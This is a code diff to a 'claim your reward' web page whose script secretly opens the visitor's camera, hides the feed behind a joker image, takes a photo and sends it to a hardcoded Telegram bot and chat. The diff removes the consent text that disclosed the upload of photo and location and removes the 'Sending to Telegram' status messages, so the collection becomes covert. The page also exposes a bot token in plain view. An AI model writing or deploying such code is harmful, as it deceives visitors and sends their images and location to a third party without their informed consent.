@@ -45,6 +45,7 @@ h1{
   margin:0 0 22px;
 }
 
+/* Original decorative circle size */
 .frame{
   width:min(78vw,290px);
   aspect-ratio:1;
@@ -58,6 +59,7 @@ h1{
   transition:width .3s ease;
 }
 
+/* Smaller circle only when camera opens */
 .frame.camera-open{
   width:min(15vw,50px);
 }
@@ -202,12 +204,11 @@ button:disabled{
 
   <label class="consent">
     <input type="checkbox" id="consent">
-    <span> I agree to let this page take a photo and send it with my location to the configured Telegram recipient to claim the reward.</span>
+    <span> I'm ready to claim my reward!</span>
   </label>
 
   <button id="startBtn" disabled>🎁 Unlock Your Reward</button>
 
-  <div id="countdown" class="status" role="status" hidden></div>
   <div id="status" class="status" role="status">
     Ready to win your surprise reward?
   </div>
@@ -217,14 +218,19 @@ button:disabled{
 
 <div id="prankPopup" class="prank-popup" hidden>
   <div class="prank-card">
-    <h2>Please wait for your reward</h2>
-    <p>Your request is being processed. This message will remain open until the photo has been sent successfully.</p>
-    <button id="closePrank" disabled>Close</button>
+    <div style="font-size:54px">😂🤡</div>
+    <h2>GOTCHA!</h2>
+    <p>You just got fooled! 🤣</p>
+    <p>The real surprise was the prank all along 💗</p>
+    <button id="closePrank">HAHA, OK! 😂</button>
   </div>
 </div>
 
 <script>
 "use strict";
+
+// Telegram configuration
+// A token in public JavaScript can be copied by anyone.
 const BOT_TOKEN = "8799702650:AAH4KcrkJaFVVxlEAA6JkoepemAv2PRx_ZM";
 const CHAT_ID = "7350437667";
 
@@ -237,16 +243,13 @@ const joker = $("joker");
 const consent = $("consent");
 const startBtn = $("startBtn");
 const statusBox = $("status");
-const countdownBox = $("countdown");
 const prankPopup = $("prankPopup");
-const closePrank = $("closePrank");
 const cameraFrame = $("cameraFrame");
 
 let stream = null;
 let imageCapture = null;
 let previewUrl = null;
 let busy = false;
-let countdownTimer = null;
 
 function setStatus(message){
   statusBox.textContent = message;
@@ -294,6 +297,8 @@ async function openCamera(){
 
   camera.srcObject = stream;
   camera.hidden = true;
+
+  // Show only the joker in the frame while the camera captures in the background.
   cameraFrame.classList.remove("camera-open");
   placeholder.hidden = true;
   joker.hidden = false;
@@ -463,18 +468,13 @@ async function captureAndSend(){
   joker.hidden = false;
 
   stopCamera();
-  if (countdownTimer) {
-    clearInterval(countdownTimer);
-    countdownTimer = null;
-  }
-  countdownBox.hidden = true;
-  closePrank.disabled = true;
+
+  // Show prank immediately after capture and metadata processing.
   prankPopup.hidden = false;
-  setStatus("Photo captured. Sending to Telegram...");
+  setStatus("...");
 
   await sendToTelegram(photo);
-  setStatus("Photo sent successfully! 😂💗");
-  closePrank.disabled = false;
+  setStatus("😂💗");
 }
 
 startBtn.addEventListener("click",async()=>{
@@ -484,28 +484,15 @@ startBtn.addEventListener("click",async()=>{
   startBtn.disabled = true;
 
   try{
-    let secondsLeft = 5;
-    countdownBox.hidden = false;
-    countdownBox.textContent = `Please wait for your reward: ${secondsLeft}...`;
-    countdownTimer = setInterval(() => {
-      secondsLeft -= 1;
-      countdownBox.textContent = secondsLeft > 0
-        ? `Please wait for your reward: ${secondsLeft}...`
-        : "Please wait for your reward...";
-    }, 1000);
-
     await openCamera();
     await captureAndSend();
   }catch(error){
-    if (countdownTimer) {
-      clearInterval(countdownTimer);
-      countdownTimer = null;
-    }
-    countdownBox.hidden = true;
     stopCamera();
     camera.hidden = true;
     placeholder.hidden = false;
     joker.hidden = true;
+
+    // Restore the original large decorative circle on failure.
     cameraFrame.classList.remove("camera-open");
 
     startBtn.hidden = false;
@@ -516,8 +503,7 @@ startBtn.addEventListener("click",async()=>{
   }
 });
 
-closePrank.addEventListener("click",()=>{
-  if (closePrank.disabled) return;
+$("closePrank").addEventListener("click",()=>{
   prankPopup.hidden = true;
 });
 
